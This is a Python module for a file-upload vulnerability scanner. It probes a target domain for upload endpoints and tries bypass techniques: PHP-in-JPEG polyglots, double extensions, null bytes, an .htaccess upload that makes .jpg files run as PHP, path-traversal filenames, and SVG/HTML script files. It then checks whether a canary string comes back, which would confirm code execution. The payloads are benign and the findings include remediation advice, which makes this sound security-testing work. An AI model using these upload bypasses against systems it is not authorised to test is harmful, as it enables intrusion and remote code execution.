"""File Upload — MIME bypass, extension confusion, and WebShell upload scanner.

Tests file upload endpoints for: MIME type bypass (image/jpeg with PHP content),
double extension bypass (shell.php.jpg), null byte injection (shell.php%00.jpg),
IIS tilde bypass, polyglot files (JPEG+PHP), and MIME type confusion attacks.

Standard attack path: upload bypass → execute webshell → full RCE.
"""

from __future__ import annotations

import asyncio
import re
import uuid
from typing import Any
from urllib.parse import urlparse, urljoin

import httpx
import structlog

from src.adapters.scanners.base import BaseOsintScanner
from src.core.domain.entities.types import ScanInputType

log = structlog.get_logger()

# Common upload endpoint paths
_UPLOAD_PATHS: list[str] = [
    "/upload", "/uploads", "/api/upload", "/api/v1/upload",
    "/file/upload", "/files/upload", "/media/upload",
    "/image/upload", "/images/upload", "/avatar/upload",
    "/profile/avatar", "/api/files", "/api/media",
    "/document/upload", "/attachment/upload",
    "/admin/upload", "/api/v1/files",
    "/import", "/api/import",
]

# Canary string in WebShell probes — safe marker, no actual execution
_CANARY = f"wscan_{uuid.uuid4().hex[:8]}"

# Polyglot JPEG+PHP payload — valid JPEG header with PHP comment
# The PHP code just echoes the canary (benign detection only)
_POLY_JPEG_PHP = (
    b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    + f"<?php echo '{_CANARY}'; ?>".encode()
    + b"\xff\xd9"
)

# SVG with embedded script (SVG XSS)
_SVG_XSS = f'''<svg xmlns="http://www.w3.org/2000/svg">
<script>document.title="{_CANARY}"</script>
<text>test</text>
</svg>'''.encode()

# HTML file (for stored XSS via upload)
_HTML_PAYLOAD = f'<html><script>document.title="{_CANARY}"</script></html>'.encode()

# Upload bypass test cases
_BYPASS_CASES: list[tuple[str, bytes, str, str, str]] = [
    # (filename, content, content_type, bypass_technique, description)
    ("shell.php.jpg",       _POLY_JPEG_PHP,  "image/jpeg",       "double_ext",      "Double extension: .php.jpg"),
    ("shell.pHp",           _POLY_JPEG_PHP,  "image/jpeg",       "case_variation",  "Case variation: .pHp"),
    ("shell.php%00.jpg",    _POLY_JPEG_PHP,  "image/jpeg",       "null_byte",       "Null byte: .php%00.jpg"),
    ("shell.php5",          _POLY_JPEG_PHP,  "image/jpeg",       "alt_php_ext",     "Alt PHP extension: .php5"),
    ("shell.phtml",         _POLY_JPEG_PHP,  "image/jpeg",       "phtml_ext",       "PHTML extension"),
    ("shell.shtml",         _POLY_JPEG_PHP,  "image/jpeg",       "shtml_ssi",       "SHTML SSI extension"),
    ("shell.svg",           _SVG_XSS,        "image/svg+xml",    "svg_xss",         "SVG with embedded script"),
    ("shell.html",          _HTML_PAYLOAD,   "text/plain",       "html_xss",        "HTML file upload (XSS)"),
    ("shell.jpg",           _POLY_JPEG_PHP,  "image/jpeg",       "polyglot",        "JPEG+PHP polyglot"),
    (".htaccess",           b"AddType application/x-httpd-php .jpg", "text/plain", "htaccess_override", ".htaccess upload"),
    ("../../../tmp/x.jpg",  _POLY_JPEG_PHP,  "image/jpeg",       "path_traversal",  "Path traversal in filename"),
    ("shell.jsp",           _POLY_JPEG_PHP,  "image/octet-stream","jsp_ext",        "JSP extension"),
    ("shell.asp",           _POLY_JPEG_PHP,  "image/jpeg",       "asp_ext",         "ASP extension"),
    ("shell.aspx",          _POLY_JPEG_PHP,  "image/jpeg",       "aspx_ext",        "ASPX extension"),
]

# Successful upload indicators
_UPLOAD_SUCCESS = re.compile(
    r'(?i)("url"|"path"|"filename"|"file_url"|"location"|upload.*success|'
    r'uploaded|saved|stored|created)',
)

# Execution indicators (canary returned = code executed)
_EXECUTION_CONFIRM = re.compile(re.escape(_CANARY))


class FileUploadScanner(BaseOsintScanner):
    """File upload vulnerability scanner — MIME bypass, extension confusion, WebShell.

    Discovers upload endpoints, then tests each with bypass techniques:
    double extension, null byte, case variation, polyglot files, SVG XSS,
    and path traversal in filenames.
    """

    scanner_name = "file_upload"
    supported_input_types = frozenset({ScanInputType.DOMAIN, ScanInputType.URL})
    cache_ttl = 3600
    scan_timeout = 120

    async def _do_scan(self, input_value: str, input_type: ScanInputType) -> dict[str, Any]:
        base_url = _normalise_url(input_value, input_type)
        return await self._manual_scan(base_url, input_value)

    async def _manual_scan(self, base_url: str, input_value: str) -> dict[str, Any]:
        vulnerabilities: list[dict[str, Any]] = []
        identifiers: list[str] = []
        upload_endpoints: list[str] = []
        uploaded_urls: list[str] = []

        async with httpx.AsyncClient(
            timeout=10,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (compatible; FileUploadScanner/1.0)"},
        ) as client:
            semaphore = asyncio.Semaphore(6)

            # Step 1: Discover upload endpoints
            async def find_upload(path: str) -> None:
                async with semaphore:
                    url = base_url.rstrip("/") + path
                    try:
                        # GET to see if endpoint exists
                        resp = await client.get(url)
                        if resp.status_code in (200, 405):
                            body = resp.text.lower()
                            if any(kw in body for kw in ["upload", "file", "attach", "import", "browse"]) \
                               or resp.status_code == 405:
                                upload_endpoints.append(url)
                                return

                        # Try a benign POST
                        resp = await client.post(
                            url,
                            files={"file": ("test.txt", b"test", "text/plain")},
                        )
                        if resp.status_code not in (404, 405, 501):
                            if url not in upload_endpoints:
                                upload_endpoints.append(url)
                    except Exception:
                        pass

            await asyncio.gather(*[find_upload(p) for p in _UPLOAD_PATHS])

            # Step 2: Test bypass techniques on each endpoint
            async def test_bypass(
                endpoint: str, filename: str, content: bytes,
                content_type: str, technique: str, description: str,
            ) -> None:
                async with semaphore:
                    try:
                        resp = await client.post(
                            endpoint,
                            files={"file": (filename, content, content_type)},
                        )
                        body = resp.text
                        status = resp.status_code

                        if status in (200, 201) and _UPLOAD_SUCCESS.search(body):
                            # Extract uploaded file URL from response
                            url_match = re.search(
                                r'(?i)"(?:url|path|file_url|location)"\s*:\s*"([^"]+)"',
                                body,
                            )
                            uploaded_url = url_match.group(1) if url_match else None

                            vuln: dict[str, Any] = {
                                "type": "file_upload_bypass",
                                "severity": "high" if technique not in ("path_traversal", "htaccess_override") else "critical",
                                "endpoint": endpoint,
                                "filename": filename,
                                "technique": technique,
                                "description": f"File upload bypass: {description}",
                                "uploaded_url": uploaded_url,
                                "remediation": "Whitelist allowed MIME types and extensions; rename uploaded files; store outside webroot",
                            }

                            # Special severities
                            if technique in ("htaccess_override", "path_traversal"):
                                vuln["severity"] = "critical"
                                vuln["description"] += " — potential RCE"

                            if technique == "svg_xss":
                                vuln["severity"] = "medium"
                                vuln["type"] = "svg_xss_upload"
                                vuln["description"] = "SVG file accepted — XSS possible when served"

                            vulnerabilities.append(vuln)
                            ident = f"vuln:upload:{technique}"
                            if ident not in identifiers:
                                identifiers.append(ident)

                            # Step 3: Try to access uploaded file and check for execution
                            if uploaded_url:
                                full_url = uploaded_url if uploaded_url.startswith("http") else urljoin(base_url, uploaded_url)
                                uploaded_urls.append(full_url)
                                try:
                                    exec_resp = await client.get(full_url)
                                    if _EXECUTION_CONFIRM.search(exec_resp.text):
                                        vulnerabilities.append({
                                            "type": "webshell_executed",
                                            "severity": "critical",
                                            "endpoint": endpoint,
                                            "shell_url": full_url,
                                            "technique": technique,
                                            "evidence": _CANARY,
                                            "description": f"CRITICAL: Uploaded file executed — canary '{_CANARY}' returned. RCE confirmed.",
                                            "remediation": "Immediately delete uploaded files; patch upload handler; store outside webroot",
                                        })
                                        identifiers.append("vuln:upload:rce_confirmed")
                                except Exception:
                                    pass

                    except Exception:
                        pass

            tasks = []
            for endpoint in upload_endpoints[:4]:
                for filename, content, ct, technique, description in _BYPASS_CASES:
                    tasks.append(test_bypass(endpoint, filename, content, ct, technique, description))
            await asyncio.gather(*tasks)

        severity_counts: dict[str, int] = {}
        for v in vulnerabilities:
            s = v.get("severity", "info")
            severity_counts[s] = severity_counts.get(s, 0) + 1

        return {
            "input": input_value,
            "scan_mode": "manual_fallback",
            "base_url": base_url,
            "upload_endpoints_found": upload_endpoints,
            "bypasses_found": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "total_found": len(vulnerabilities),
            "severity_summary": severity_counts,
            "extracted_identifiers": identifiers,
        }

    def _extract_identifiers(self, raw_data: dict[str, Any]) -> list[str]:
        return raw_data.get("extracted_identifiers", [])


def _normalise_url(value: str, input_type: ScanInputType) -> str:
    if input_type == ScanInputType.DOMAIN:
        return f"https://{value}"
    if not value.startswith(("http://", "https://")):
        return f"https://{value}"
    return value
